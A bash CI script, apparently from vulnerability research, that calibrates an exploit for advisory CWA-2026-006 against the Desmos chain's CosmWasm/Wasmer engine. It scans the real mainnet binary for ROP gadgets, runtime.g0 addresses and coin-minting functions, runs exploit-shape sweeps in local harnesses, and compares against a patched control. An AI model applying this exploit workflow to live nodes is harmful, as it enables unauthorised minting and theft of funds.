#!/usr/bin/env bash
# crosschain/desmos/ci/run.sh — Desmos-specific CWA-2026-006 calibration (CI).
#
# READ-ONLY static analysis + LOCAL in-process harness runs. No chain interaction,
# no keys, no signing, no deployment, no broadcast. Heavy work (94 MB release
# download, Go toolchains, SDK build, objdump, harness runs) runs on GitHub Actions
# via:  bash /home/heisenberg/CA/ci/ci-run.sh crosschain
#
# Evidence -> crosschain/ci-out/desmos/ (uploaded as artifact result-crosschain).
set -uo pipefail
cd "$(dirname "$0")/.."          # -> crosschain/desmos
ROOT="$PWD"
OUT="$ROOT/../ci-out/desmos"
mkdir -p "$OUT"
W=/tmp/desmos-ci;   mkdir -p "$W"
P="$ROOT/ci"
say(){ echo; echo "=== $* ==="; }

export GOTOOLCHAIN=local
export GOFLAGS=-mod=mod
export GOPROXY=https://proxy.golang.org,direct

# ---------------------------------------------------------------- Phase 0
say "Phase 0: toolchains"
install_go(){
  local v="$1"
  local d="/tmp/go$v"
  if [ -x "$d/bin/go" ]; then echo "go$v already present"; return 0; fi
  echo "installing go$v ..."
  curl -sL --max-time 1200 "https://go.dev/dl/go${v}.linux-amd64.tar.gz" -o "$W/go$v.tgz" || return 1
  mkdir -p "$d"; tar -C "$d" --strip-components=1 -xzf "$W/go$v.tgz" || return 1
  "$d/bin/go" version
}
install_go 1.21.13
install_go 1.23.5
install_go 1.25.0
install_go 1.20.14
GO121=/tmp/go1.21.13/bin/go
GO123=/tmp/go1.23.5/bin/go
GO125=/tmp/go1.25.0/bin/go
GO120=/tmp/go1.20.14/bin/go
$GO121 version || true
$GO123 version || true
$GO125 version || true
$GO120 version || true

# ---------------------------------------------------------------- Phase 1
say "Phase 1: Desmos mainnet release binary (v7.1.1)"
BIN="$W/desmos-v7.1.1"
URL="https://github.com/desmos-labs/desmos/releases/download/v7.1.1/desmos-v7.1.1-linux-amd64"
if [ ! -s "$BIN" ]; then
  for t in 1 2 3 4; do
    curl -sL --max-time 1800 -o "$BIN" "$URL" || true
    if [ -s "$BIN" ] && [ "$(head -c4 "$BIN" | od -An -tx1 | tr -d ' ')" = "7f454c46" ]; then break; fi
    rm -f "$BIN"; sleep 10
  done
fi
sha256sum "$BIN" | tee "$OUT/desmos_binary.sha256"
{ file "$BIN"; readelf -h "$BIN" 2>/dev/null | grep -E "Type:|Entry point|Machine:"; } | tee "$OUT/desmos_binary.elf"
$GO123 version -m "$BIN" > "$W/desmos_buildinfo.txt" 2>&1
head -1 "$W/desmos_buildinfo.txt" | tee "$OUT/desmos_goversion.txt"
grep -iE 'wasmvm|wasmd|cosmos-sdk|cometbft|ibc-go' "$W/desmos_buildinfo.txt" | tee "$OUT/desmos_builddeps.txt"
strings -n 6 "$BIN" 2>/dev/null \
  | grep -oE 'wasmer-compiler-singlepass-4\.[0-9.]+|wasmer-4\.[0-9.]+|cosmwasm-vm-[0-9.]+|corosensei-[0-9.]+' \
  | sort | uniq -c | sort -rn | tee "$OUT/desmos_engine_strings.txt"

# ---------------------------------------------------------------- Phase 2
say "Phase 2: pclntab symbols + objdump (Desmos)"
( cd "$ROOT/pclntab_dump" && $GO123 build -o "$W/pclntab_dump" . ) 2>&1 | tail -5
$W/pclntab_dump "$BIN" > "$W/desmos.functions.txt" 2> "$OUT/desmos.pclntab.err"
echo "functions: $(wc -l < "$W/desmos.functions.txt")"
ASM="$W/desmos.asm"
if [ ! -s "$ASM" ]; then timeout 3000 objdump -d "$BIN" > "$ASM" 2>/dev/null; fi
echo "objdump lines: $(wc -l < "$ASM" 2>/dev/null || echo 0)"
python3 "$P/gadgets.py" "$ASM" "$OUT/desmos_gadgets.json" | tee "$OUT/desmos_gadgets.summary.txt"

FNS="$W/desmos.functions.txt"
{
  echo "## Go re-entry / cgo"
  grep -E 'runtime\.cgocallback|crosscall2|runtime\.needm|runtime\.asmcgocall|runtime\.rt0_go|runtime\.mstart' "$FNS"
  echo "## wasmvm callbacks"
  grep -E 'wasmvm/internal/api\.(cSet|cGet|cQueryExternal|cDelete)' "$FNS"
  echo "## bank / mint targets"
  grep -Ei '(BaseKeeper|BaseSendKeeper)\.(MintCoins|SendCoinsFromModuleToAccount|SendCoinsFromModuleToModule|addCoins|setBalance)' "$FNS"
  echo "## sdk.Context methods"
  grep -E 'cosmos-sdk/types\.Context\.(KVStore|CacheContext|Value)' "$FNS"
} | tee "$OUT/desmos_symbols.txt"

say "Phase 2b: runtime.g0 / m0 candidate derivation (stripped binary)"
ENTRY=$(readelf -h "$BIN" | awk '/Entry point/{print $4}')
RT0=$(grep -E 'runtime\.rt0_go$' "$FNS" | head -1 | awk '{print $1}')
{
  echo "## ELF entry = $ENTRY ; pclntab runtime.rt0_go = $RT0"
  if [ -n "$ENTRY" ]; then
    lo=$((ENTRY)); hi=$((lo + 0x60))
    objdump -d --start-address=$lo --stop-address=$hi "$BIN" 2>/dev/null
  fi
} > "$OUT/desmos_entry_stub.txt" 2>&1
cat "$OUT/desmos_entry_stub.txt"
# the ELF entry stub passes the real rt0_go entry in %rdi (the pclntab rt0_go is mis-delimited)
RT0REAL=$(grep -oE 'mov[[:space:]]+\$0x[0-9a-f]+,%rdi' "$OUT/desmos_entry_stub.txt" | tail -1 | grep -oE '0x[0-9a-f]+')
echo "rt0_go (from entry-stub %rdi) = ${RT0REAL:-none}"
{
  echo "## rt0 region @${RT0REAL:-?} (g0/m0 candidates: lea/mov referencing .data/.bss)"
  if [ -n "$RT0REAL" ]; then
    lo=$((RT0REAL)); hi=$((lo + 0x600))
    objdump -d --start-address=$lo --stop-address=$hi "$BIN" 2>/dev/null > "$OUT/desmos_rt0go.txt"
    grep -nE '# 0x[0-9a-f]{6,}' "$OUT/desmos_rt0go.txt" | head -60
  fi
} | tee "$OUT/desmos_g0_candidates.txt"

# ---------------------------------------------------------------- helpers
derive(){  # $1=binary $2=go $3=prefix  -> "mint cgocb g0 pivot poprax guard ud2"
  local bin="$1"; local go="$2"; local pfx="$3"
  local nm="$W/${pfx}.nm"
  $go tool nm "$bin" > "$nm" 2>/dev/null
  local m c g p q r u
  m=$(grep -E ' main\.mintBridge$' "$nm" | head -1 | awk '{print $1}')
  c=$(grep -E ' runtime\.cgocallback(\.abi0)?$' "$nm" | head -1 | awk '{print $1}')
  g=$(grep -E ' runtime\.g0$' "$nm" | head -1 | awk '{print $1}')
  p=$(grep -E ' gadget_pivot$' "$nm" | head -1 | awk '{print $1}')
  q=$(grep -E ' gadget_poprax$' "$nm" | head -1 | awk '{print $1}')
  r=$(grep -E ' gadget_guardclear$' "$nm" | head -1 | awk '{print $1}')
  u=$(grep -E ' gadget_ud2$' "$nm" | head -1 | awk '{print $1}')
  echo "$m $c $g $p $q $r $u"
}
recal_run(){  # $1=binary $2=go $3=prefix $4=extra recal args
  local bin="$1" go="$2" pfx="$3"; shift 3
  local m c g p q r u; read m c g p q r u <<< "$(derive "$bin" "$go" "$pfx")"
  objdump -d "$bin" > "$W/$pfx.asm" 2>/dev/null
  python3 "$P/gadgets.py" "$W/$pfx.asm" "$OUT/${pfx}_gadgets.json" | tee "$OUT/${pfx}_gadgets.summary.txt"
  {
    echo "mint=$m cgocb=$c g0=$g pivot=$p poprax=$q guard=$r ud2=$u"
    grep -E ' runtime\.cgocallback| main\.mintBridge| runtime\.g0$| runtime\.m0$' "$W/${pfx}.nm"
  } | tee "$OUT/${pfx}_symbols.txt"
  [ -z "$p" ] && { echo "[$pfx] NO FARM/CHAIN — skip"; return 1; }
  python3 "$P/recal.py" --gadgets "$OUT/${pfx}_gadgets.json" \
    --g0 "0x$g" --cgocb "0x$c" --ud2 "0x$u" --mint "0x$m" \
    --pivot "0x$p" --poprax "0x$q" --guard "0x$r" \
    --harness "$bin" --gen "$ROOT/guests/gen_nested_contracts.py" \
    --wat2wasm "$ROOT/guests/wat2wasm" --workdir "$W/wd-$pfx" \
    --out "$OUT/${pfx}_recal.json" "$@" 2>&1 | tee "$OUT/${pfx}_recal.log"
}

# ---------------------------------------------------------------- Phase 4
say "Phase 4: Desmos-matched harness (go1.21.13 + sdk0.47.10 + wasmvm1.5.3)"
H="$ROOT/harness"
( cd "$H" && $GO121 mod tidy ) > "$OUT/harness_desmos_gomod.log" 2>&1
SDK_OK=0
if ( cd "$H" && $GO121 build -o "$W/harness-desmos-sdk" . ) > "$OUT/harness_desmos_build.log" 2>&1; then
  SDK_OK=1; echo "harness-desmos-sdk: BUILD OK"
else
  echo "harness-desmos-sdk: SDK build FAILED"; tail -30 "$OUT/harness_desmos_build.log"
fi
# minimal harness (Desmos Go/wasmvm, no SDK) — always built
( cd "$ROOT/harness-min" && $GO121 mod tidy ) > "$OUT/harness_min_gomod.log" 2>&1
( cd "$ROOT/harness-min" && $GO121 build -o "$W/harness-desmos-min" . ) >> "$OUT/harness_desmos_build.log" 2>&1

# Go 1.20.14 SDK harness (the *release binary's* toolchain — see desmos_goversion.txt)
D120="$W/src-sdk-g120"; rm -rf "$D120"; cp -r "$H" "$D120"
( cd "$D120" && sed -i 's/^go 1\.21$/go 1.20/' go.mod && $GO120 mod tidy \
    && $GO120 build -o "$W/harness-desmos-sdk-g120" . ) > "$OUT/harness_desmos_g120_build.log" 2>&1
if [ -x "$W/harness-desmos-sdk-g120" ]; then echo "harness-desmos-sdk-g120: BUILD OK"; else
  echo "harness-desmos-sdk-g120: FAILED"; tail -8 "$OUT/harness_desmos_g120_build.log"; fi

if [ "$SDK_OK" = "1" ]; then HARNESS="$W/harness-desmos-sdk"; else HARNESS="$W/harness-desmos-min"; fi
file "$HARNESS" | tee "$OUT/harness_desmos.file"
readelf -h "$HARNESS" 2>/dev/null | grep -E "Type:|Entry point" | tee -a "$OUT/harness_desmos.file"
sha256sum "$HARNESS" | tee "$OUT/harness_desmos.sha256"
"$HARNESS" -bank-check 2>&1 | tee "$OUT/harness_desmos_bankcheck.txt" || true

# ---------------------------------------------------------------- Phase 4b
say "Phase 4b: isolation variants (Go x wasmvm, minimal harness)"
build_variant(){  # $1=name $2=go $3=wasmvm
  local name="$1"; local go="$2"; local wm="$3"
  local d="$W/src-$name"
  rm -rf "$d"; cp -r "$ROOT/harness-min" "$d"
  ( cd "$d" && $go mod edit -require=github.com/CosmWasm/wasmvm@$wm \
      && $go mod tidy && $go build -o "$W/$name" . ) > "$OUT/${name}_build.log" 2>&1
  if [ -x "$W/$name" ]; then echo "$name OK"; else echo "$name FAILED"; tail -6 "$OUT/${name}_build.log"; fi
}
build_variant h_g121_w153 "$GO121" v1.5.3
build_variant h_g121_w155 "$GO121" v1.5.5
build_variant h_g123_w153 "$GO123" v1.5.3
build_variant h_g123_w155 "$GO123" v1.5.5
build_variant h_g120_w153 "$GO120" v1.5.3

# libwasmvm dirs (rpath is baked, but set LD_LIBRARY_PATH defensively per variant)
libdir(){ find "$($1 env GOMODCACHE)" -name 'libwasmvm.x86_64.so' -path "*$2*" 2>/dev/null | head -1; }

say "Phase 5: native-chain derivation + PoC-params rate (SDK match + variants)"
for spec in "harness-desmos $HARNESS $GO121" \
            "harness-desmos-g120 $W/harness-desmos-sdk-g120 $GO120" \
            "h_g121_w153 $W/h_g121_w153 $GO121" \
            "h_g121_w155 $W/h_g121_w155 $GO121" \
            "h_g123_w153 $W/h_g123_w153 $GO123" \
            "h_g123_w155 $W/h_g123_w155 $GO123" \
            "h_g120_w153 $W/h_g120_w153 $GO120"; do
  set -- $spec; pfx="$1"; bin="$2"; go="$3"
  [ -x "$bin" ] || { echo "[$pfx] not built"; continue; }
  L=$(libdir "$go" "wasmvm@v1.5.3"); [ -z "$L" ] && L=$(libdir "$go" "wasmvm@v1.5.5")
  [ -n "$L" ] && export LD_LIBRARY_PATH="$(dirname "$L"):${LD_LIBRARY_PATH:-}"
  echo "---- $pfx ($bin) ----"
  recal_run "$bin" "$go" "$pfx" --warmups-list 3 --frame32-list 2 --drops-list 15 \
    --offset-list 278 --attempts 4 --max-shapes 1
done

# ---------------------------------------------------------------- Phase 6
say "Phase 6: reach (--iters) x phase sweep on the Desmos match (Go 1.21.13 + Go 1.20.14)"
# PRIMARY untested axis: the drift reach. --iters 66283 ~ 1 fibre; if the trigger fibre is
# further from the holder, the drift stops short. Sweep reach x call-phase.
for spec in "desmos_g121 $HARNESS $GO121" \
            "desmos_g120 $W/harness-desmos-sdk-g120 $GO120"; do
  set -- $spec; pfx="$1"; bin="$2"; go="$3"
  [ -x "$bin" ] || { echo "[$pfx] not built"; continue; }
  L=$(libdir "$go" "wasmvm@v1.5.3"); [ -n "$L" ] && export LD_LIBRARY_PATH="$(dirname "$L"):${LD_LIBRARY_PATH:-}"
  OFF=$(seq 0 4 508 | paste -sd,)
  recal_run "$bin" "$go" "${pfx}_reach" \
    --warmups-list 3 --frame32-list 2 --drops-list 15 --dummy-list 0 \
    --iters-list 66283,131819,197355 --offset-list "$OFF" --attempts 2 --diag
done

# ---------------------------------------------------------------- Phase 7
say "Phase 7: patched control (wasmvm v3.0.8 / Wasmer 7.4.2)"
FX="$ROOT/harness-fixed"
FIXED=""
if ( cd "$FX" && $GO125 build -o "$W/harness-fixed" . ) > "$OUT/harness_fixed_build.log" 2>&1; then
  FIXED="$W/harness-fixed"; echo "harness-fixed: BUILD OK (go1.25)"
elif ( cd "$FX" && $GO123 build -o "$W/harness-fixed" . ) >> "$OUT/harness_fixed_build.log" 2>&1; then
  FIXED="$W/harness-fixed"; echo "harness-fixed: BUILD OK (go1.23)"
else
  echo "harness-fixed: BUILD FAILED"; tail -20 "$OUT/harness_fixed_build.log"
fi
if [ -n "$FIXED" ]; then
  L=$(libdir "$GO125" "wasmvm/v3@v3.0.8"); [ -z "$L" ] && L=$(find "$($GO125 env GOMODCACHE)" -name 'libwasmvm.x86_64.so' -path '*wasmvm/v3@v3.0.8*' 2>/dev/null | head -1)
  [ -n "$L" ] && export LD_LIBRARY_PATH="$(dirname "$L"):${LD_LIBRARY_PATH:-}"
  GU=$(ls -d "$W"/wd-desmos_g1*/s-* 2>/dev/null | head -1)
  mkdir -p "$W/runs-fixed"
  if [ -s "$GU/holder.wasm" ]; then
    for i in 1 2 3; do
      timeout 60 "$FIXED" -wasm "$GU/holder.wasm" -trigger "$GU/trigger.wasm" \
        -benign "$GU/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -tracenested \
        -out "$W/runs-fixed/fixed-$i.json" > "$W/runs-fixed/fixed-$i.stdout" 2> "$W/runs-fixed/fixed-$i.stderr"
      echo "fixed attempt=$i exit=$?"
    done
    echo "M4BANK in fixed runs: $(grep -l M4BANK "$W/runs-fixed"/*.stderr 2>/dev/null | wc -l)"
    grep -hE 'M4BANK|NESTEDRESULT' "$W/runs-fixed"/*.stderr | head -20 | tee "$OUT/harness_fixed_runs.txt"
  fi
fi

# ---------------------------------------------------------------- Phase 8
say "Phase 8: pipeline control (go1.23.5 + sdk0.50.10 + wasmvm1.5.5, exact PoC shape)"
C="$ROOT/harness-control"
if ( cd "$C" && $GO123 build -o "$W/harness-control" . ) > "$OUT/harness_control_build.log" 2>&1; then
  echo "harness-control: BUILD OK"
  L=$(libdir "$GO123" "wasmvm@v1.5.5"); [ -n "$L" ] && export LD_LIBRARY_PATH="$(dirname "$L"):${LD_LIBRARY_PATH:-}"
  recal_run "$W/harness-control" "$GO123" harness_control \
    --warmups-list 3 --frame32-list 2 --drops-list 15 --offset-list 278 \
    --attempts 3 --max-shapes 1
else
  echo "harness-control: BUILD FAILED"; tail -20 "$OUT/harness_control_build.log" || true
fi

say "done"
ls -la "$OUT"
